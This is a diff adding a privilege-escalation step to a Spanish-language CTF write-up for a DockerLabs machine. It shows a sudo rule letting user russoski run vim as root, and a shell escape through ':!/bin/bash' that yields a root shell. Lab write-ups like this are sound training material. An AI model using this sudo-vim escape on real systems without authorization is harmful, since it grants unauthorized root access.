@@ -122,8 +122,15 @@ Matching Defaults entries for russoski on dockerlabs:
 User russoski may run the following commands on dockerlabs:
     (root) NOPASSWD: /usr/bin/vim
 ```
+Aprovechamos la misconfiguration, ejecutando vim como sudo.
+En `vim`, para darle una instrucción al editor escribimos dos puntos (`:`). Para decirle que queremos ejecutar algo en la consola, usamos el signo de exclamación (`!`). Simplemente escribimos `:!/bin/bash`
+```shell
+russoski@dockerlabs:~$ sudo vim
 
-
+root@dockerlabs:/home/russoski# whoami
+root
+```
+Obteniendo el usuario Root
 ## 4. 🚩 Banderas (Flags)
-- **User:** 
-- **Root**: 
+- **User:** N/A
+- **Root**: N/A
